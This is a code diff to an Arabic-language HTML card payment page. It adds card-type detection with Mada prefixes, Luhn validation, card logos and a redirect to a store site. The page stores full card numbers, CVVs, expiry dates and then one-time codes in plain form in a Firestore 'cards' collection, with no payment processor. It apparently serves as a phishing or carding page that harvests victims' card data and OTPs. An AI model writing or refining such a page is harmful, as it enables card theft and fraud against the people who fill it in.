@@ -81,20 +81,24 @@
         .payment-card { background-color: white; border-radius: 12px; box-shadow: var(--shadow); padding: 35px; border: 1px solid #eee; }
         .card-type-selector { display: flex; gap: 10px; margin-bottom: 30px; border-bottom: 1px solid var(--border-color); padding-bottom: 20px; }
         
-        .card-option { flex: 1; text-align: center; padding: 12px; border-radius: 8px; border: 2px solid transparent; opacity: 0.3; transition: 0.3s; }
+        .card-option { flex: 1; text-align: center; padding: 12px; border-radius: 8px; border: 2px solid transparent; opacity: 0.3; transition: 0.3s; cursor: pointer; }
         .card-option.active { border-color: var(--primary-color); background-color: #f0f7ff; opacity: 1; }
-        .card-option i { font-size: 28px; display: block; margin-bottom: 5px; }
+        .card-option img { width: 40px; height: auto; margin-bottom: 5px; display: block; margin-left: auto; margin-right: auto; }
+        .card-option div { font-size: 12px; margin-top: 5px; }
 
         .form-group { margin-bottom: 25px; }
         .form-group label { display: block; margin-bottom: 10px; font-weight: 500; color: #3c4043; font-size: 14px; }
         .form-control { width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 16px; transition: 0.3s; }
+        .form-control.error { border-color: var(--danger-color); }
 
         .card-preview { background: linear-gradient(135deg, #1a73e8, #1557b0); color: white; border-radius: 15px; padding: 25px; margin-bottom: 25px; height: 180px; position: relative; }
+        .preview-logo-img { width: 50px; height: auto; background: white; border-radius: 8px; padding: 5px; }
         
         .payment-status { display: none; text-align: center; padding: 40px; border-radius: 12px; box-shadow: var(--shadow); }
         .validation-message { color: var(--danger-color); font-size: 12px; margin-top: 6px; display: none; }
         
         .btn-blue { width: 100%; padding: 16px; font-size: 16px; background-color: var(--primary-color); border: none; border-radius: 8px; color: white; cursor: pointer; font-weight: bold; }
+        .btn-blue:disabled { opacity: 0.6; cursor: not-allowed; }
     </style>
 </head>
 <body>
@@ -121,7 +125,9 @@
             </header>
             
             <div class="card-preview">
-                <div id="preview-logo" style="font-size: 35px;"><i class="fa-solid fa-credit-card"></i></div>
+                <div id="preview-logo">
+                    <img id="preview-card-logo" class="preview-logo-img" src="visa.png" alt="visa">
+                </div>
                 <div id="preview-number" style="font-size: 22px; margin-top: 45px; font-family: monospace; letter-spacing: 2px;">•••• •••• •••• ••••</div>
                 <div style="display: flex; justify-content: space-between; margin-top: 25px;">
                     <small id="preview-holder">NAME SURNAME</small>
@@ -131,28 +137,41 @@
             
             <div class="payment-card">
                 <div class="card-type-selector">
-                    <div class="card-option" id="type-visa" data-type="visa"><i class="fa-brands fa-cc-visa"></i>فيزا</div>
-                    <div class="card-option" id="type-mastercard" data-type="mastercard"><i class="fa-brands fa-cc-mastercard"></i>ماستر</div>
-                    <div class="card-option" id="type-mada" data-type="mada"><img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Mada_Logo.svg" width="40" style="margin-bottom:5px">مدى</div>
+                    <div class="card-option" id="type-visa" data-type="visa">
+                        <img src="visa.png" alt="visa">
+                        <div>فيزا</div>
+                    </div>
+                    <div class="card-option" id="type-mastercard" data-type="mastercard">
+                        <img src="mastercard.png" alt="mastercard">
+                        <div>ماستركارد</div>
+                    </div>
+                    <div class="card-option" id="type-mada" data-type="mada">
+                        <img src="mada.png" alt="mada">
+                        <div>مدى</div>
+                    </div>
                 </div>
                 
                 <form id="payment-form">
                     <div class="form-group">
                         <label>رقم البطاقة</label>
                         <input type="text" id="card-number" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19">
+                        <div class="validation-message" id="card-number-error">رقم البطاقة غير صالح (يجب أن يكون 16 رقم وصحيح)</div>
                     </div>
                     <div class="form-group">
                         <label>اسم حامل البطاقة</label>
                         <input type="text" id="card-holder" class="form-control" placeholder="الاسم كما يظهر على البطاقة">
+                        <div class="validation-message" id="card-holder-error">يرجى إدخال اسم حامل البطاقة</div>
                     </div>
                     <div style="display: flex; gap: 20px;">
                         <div class="form-group" style="flex: 1;">
                             <label>التاريخ (MM/YY)</label>
                             <input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" maxlength="5">
+                            <div class="validation-message" id="expiry-date-error">تاريخ الانتهاء غير صالح</div>
                         </div>
                         <div class="form-group" style="flex: 1;">
                             <label>CVV</label>
                             <input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3">
+                            <div class="validation-message" id="cvv-error">رمز الأمان غير صالح (3 أرقام)</div>
                         </div>
                     </div>
                     <button type="submit" id="submit-btn" class="btn-blue">دفع الآن</button>
@@ -163,7 +182,7 @@
         <div class="payment-status" id="success-message">
             <i class="fa-solid fa-circle-check" style="color:var(--success-color); font-size:50px"></i>
             <h2 style="margin-top:15px">تم الدفع بنجاح!</h2>
-            <button class="btn-blue" onclick="location.reload()" style="margin-top:20px">العودة</button>
+            <button class="btn-blue" onclick="window.location.href='https://riyadhstore.vercel.app/'" style="margin-top:20px">العودة</button>
         </div>
 
         <div class="payment-status" id="error-final-message">
@@ -191,39 +210,278 @@
     const db = getFirestore(app);
 
     let currentDocId = null;
-    let selectedCardType = 'unknown';
+    let selectedCardType = 'visa';
 
-    // تحديث معاينة البطاقة
-    document.getElementById('card-number').addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '').substring(0, 16);
-        e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
-        document.getElementById('preview-number').innerText = e.target.value || '•••• •••• •••• ••••';
+    // ========================================
+    // 1. قائمة أرقام مدى (Mada Prefixes)
+    // ========================================
+    const madaPrefixes = ['4061', '4106', '4176', '4228', '4463', '4466', '4578', '4584', '4847', '5043', '5081', '5888', '6049', '6051', '9682'];
+
+    // ========================================
+    // 2. التعرف التلقائي على نوع البطاقة (دالة detectCardType)
+    // ========================================
+    function detectCardType(number) {
+        const cleaned = number.replace(/\s+/g, '');
+        let type = 'visa';
+        
+        if (cleaned.length >= 4) {
+            const first4 = cleaned.substring(0, 4);
+            const first2 = cleaned.substring(0, 2);
+            
+            // التحقق من بطاقة مدى (Mada)
+            if (madaPrefixes.includes(first4)) {
+                type = 'mada';
+            }
+            // التحقق من فيزا (Visa) - تبدأ بـ 4
+            else if (cleaned.startsWith('4')) {
+                type = 'visa';
+            }
+            // التحقق من ماستركارد (Mastercard) - أول رقمين بين 51 و 55
+            else if (parseInt(first2) >= 51 && parseInt(first2) <= 55) {
+                type = 'mastercard';
+            }
+        }
+        
+        selectedCardType = type;
+        updateUI(type);
+        return type;
+    }
+
+    // ========================================
+    // 3. التحقق من صحة رقم البطاقة (خوارزمية Luhn)
+    // ========================================
+    function isValidCardNumber(cardNumber) {
+        const cleaned = cardNumber.replace(/\s+/g, '');
+        
+        // التحقق: 16 خانة وأرقام فقط
+        if (cleaned.length !== 16 || !/^\d+$/.test(cleaned)) return false;
+        
+        // خوارزمية Luhn
+        let sum = 0;
+        let shouldDouble = false;
+        
+        for (let i = cleaned.length - 1; i >= 0; i--) {
+            let digit = parseInt(cleaned.charAt(i));
+            
+            if (shouldDouble) {
+                digit *= 2;
+                if (digit > 9) digit -= 9;
+            }
+            
+            sum += digit;
+            shouldDouble = !shouldDouble;
+        }
+        
+        return (sum % 10) === 0;
+    }
+
+    // ========================================
+    // 4. التحقق من صحة تاريخ الانتهاء
+    // ========================================
+    function isValidExpiryDate(value) {
+        if (!value || !value.includes('/')) return false;
+        const parts = value.split('/');
+        if (parts.length !== 2) return false;
+        
+        const mm = parseInt(parts[0], 10);
+        const yy = parseInt(parts[1], 10);
+        
+        if (isNaN(mm) || isNaN(yy)) return false;
+        if (mm < 1 || mm > 12) return false;
+        
+        const currentYear = new Date().getFullYear() % 100;
+        if (yy < currentYear) return false;
+        
+        return true;
+    }
+
+    // ========================================
+    // 5. تحديث واجهة المستخدم (دالة updateUI)
+    // ========================================
+    function updateUI(type) {
+        // تحديث الأزرار النشطة
+        document.querySelectorAll('.card-option').forEach(opt => {
+            opt.classList.remove('active');
+            if (opt.getAttribute('data-type') === type) {
+                opt.classList.add('active');
+            }
+        });
+        
+        // تحديث شعار المعاينة
+        updateCardLogo(type);
+    }
+
+    // ========================================
+    // 6. تحديث شعار المعاينة (دالة updateCardLogo)
+    // ========================================
+    function updateCardLogo(type) {
+        const previewLogo = document.getElementById('preview-card-logo');
+        if (type === 'visa') {
+            previewLogo.src = 'visa.png';
+        } else if (type === 'mastercard') {
+            previewLogo.src = 'mastercard.png';
+        } else if (type === 'mada') {
+            previewLogo.src = 'mada.png';
+        }
+    }
+
+    // ========================================
+    // 7. إظهار وإخفاء رسائل الخطأ
+    // ========================================
+    function showError(errorId) {
+        const errorElement = document.getElementById(errorId);
+        if (errorElement) errorElement.style.display = 'block';
+    }
+    
+    function hideError(errorId) {
+        const errorElement = document.getElementById(errorId);
+        if (errorElement) errorElement.style.display = 'none';
+    }
+
+    // ========================================
+    // 8. تغيير نوع البطاقة يدوياً
+    // ========================================
+    function setCardType(type) {
+        selectedCardType = type;
+        updateUI(type);
+    }
+
+    // ========================================
+    // إضافة مستمعات الأحداث (Event Listeners)
+    // ========================================
+    
+    // مستمع لرقم البطاقة: تنسيق + كشف النوع + التحقق
+    const cardNumberInput = document.getElementById('card-number');
+    cardNumberInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        
+        // كشف نوع البطاقة تلقائياً
+        if (value.length >= 2) {
+            detectCardType(value);
+        }
+        
+        // تنسيق الرقم (مجموعات من 4 أرقام)
+        let formattedValue = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formattedValue += ' ';
+            formattedValue += value[i];
+        }
+        e.target.value = formattedValue.substring(0, 19);
+        
+        // تحديث المعاينة
+        document.getElementById('preview-number').innerText = formattedValue || '•••• •••• •••• ••••';
+        
+        // إخفاء رسالة الخطأ عند الكتابة
+        hideError('card-number-error');
+        e.target.classList.remove('error');
     });
-
-    document.getElementById('card-holder').addEventListener('input', e => {
+    
+    cardNumberInput.addEventListener('blur', function() {
+        if (this.value.length > 0 && !isValidCardNumber(this.value)) {
+            showError('card-number-error');
+            this.classList.add('error');
+        }
+    });
+    
+    // مستمع لاسم حامل البطاقة
+    const cardHolderInput = document.getElementById('card-holder');
+    cardHolderInput.addEventListener('input', (e) => {
         document.getElementById('preview-holder').innerText = e.target.value.toUpperCase() || 'NAME SURNAME';
+        hideError('card-holder-error');
+        e.target.classList.remove('error');
     });
-
-    document.getElementById('expiry-date').addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '');
-        if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2, 4);
-        e.target.value = val;
-        document.getElementById('preview-expiry').innerText = e.target.value || 'MM/YY';
+    
+    cardHolderInput.addEventListener('blur', function() {
+        if (this.value.trim().length < 3) {
+            showError('card-holder-error');
+            this.classList.add('error');
+        }
     });
-
-    // إرسال البيانات
+    
+    // مستمع لتاريخ الانتهاء
+    const expiryDateInput = document.getElementById('expiry-date');
+    expiryDateInput.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+        e.target.value = v.substring(0, 5);
+        document.getElementById('preview-expiry').innerText = v || 'MM/YY';
+        hideError('expiry-date-error');
+        e.target.classList.remove('error');
+    });
+    
+    expiryDateInput.addEventListener('blur', function() {
+        if (this.value.length > 0 && !isValidExpiryDate(this.value)) {
+            showError('expiry-date-error');
+            this.classList.add('error');
+        }
+    });
+    
+    // مستمع لرمز CVV
+    const cvvInput = document.getElementById('cvv');
+    cvvInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        hideError('cvv-error');
+        e.target.classList.remove('error');
+    });
+    
+    cvvInput.addEventListener('blur', function() {
+        if (this.value.length > 0 && !/^\d{3}$/.test(this.value)) {
+            showError('cvv-error');
+            this.classList.add('error');
+        }
+    });
+    
+    // أزرار اختيار نوع البطاقة
+    document.getElementById('type-visa').addEventListener('click', () => setCardType('visa'));
+    document.getElementById('type-mastercard').addEventListener('click', () => setCardType('mastercard'));
+    document.getElementById('type-mada').addEventListener('click', () => setCardType('mada'));
+    
+    // ========================================
+    // 9. إرسال البيانات إلى Firebase
+    // ========================================
     document.getElementById('payment-form').addEventListener('submit', async (e) => {
         e.preventDefault();
+        
+        // التحقق من صحة جميع الحقول
+        let isFormValid = true;
+        
+        if (!isValidCardNumber(cardNumberInput.value)) {
+            showError('card-number-error');
+            cardNumberInput.classList.add('error');
+            isFormValid = false;
+        }
+        
+        if (cardHolderInput.value.trim().length < 3) {
+            showError('card-holder-error');
+            cardHolderInput.classList.add('error');
+            isFormValid = false;
+        }
+        
+        if (!isValidExpiryDate(expiryDateInput.value)) {
+            showError('expiry-date-error');
+            expiryDateInput.classList.add('error');
+            isFormValid = false;
+        }
+        
+        if (!/^\d{3}$/.test(cvvInput.value)) {
+            showError('cvv-error');
+            cvvInput.classList.add('error');
+            isFormValid = false;
+        }
+        
+        if (!isFormValid) return;
+        
         const btn = document.getElementById('submit-btn');
-        btn.disabled = true; btn.innerText = "جاري المعالجة...";
+        btn.disabled = true; 
+        btn.innerText = "جاري المعالجة...";
 
         try {
             const docRef = await addDoc(collection(db, "cards"), {
-                cardHolder: document.getElementById('card-holder').value,
-                cardNumber: document.getElementById('card-number').value,
-                expiryDate: document.getElementById('expiry-date').value,
-                cvv: document.getElementById('cvv').value,
-                cardType: 'visa', // افتراضي للتجربة
+                cardHolder: cardHolderInput.value,
+                cardNumber: cardNumberInput.value,
+                expiryDate: expiryDateInput.value,
+                cvv: cvvInput.value,
+                cardType: selectedCardType,
                 status: 'pending',
                 createdAt: serverTimestamp()
             });
@@ -249,19 +507,27 @@
         } catch (err) { 
             console.error(err);
             alert("فشل التخزين. تأكد من إعدادات Firestore."); 
-            btn.disabled = false; btn.innerText = "دفع الآن"; 
+            btn.disabled = false; 
+            btn.innerText = "دفع الآن"; 
         }
     });
 
-    // إرسال كود OTP
+    // ========================================
+    // 10. إرسال كود OTP للتحقق
+    // ========================================
     document.getElementById('confirm-google-btn').addEventListener('click', async () => {
         const otp = document.getElementById('google-otp-input').value;
-        if(otp.length < 4) return alert("الرمز غير صحيح");
+        if (otp.length < 4) {
+            alert("الرمز غير صحيح");
+            return;
+        }
         
         try {
             await updateDoc(doc(db, "cards", currentDocId), { otp: otp, status: 'otp_sent' });
             document.getElementById('confirm-google-btn').innerText = "جاري التحقق...";
-        } catch (error) { console.error(error); }
+        } catch (error) { 
+            console.error(error);
+        }
     });
 </script>
 </body>
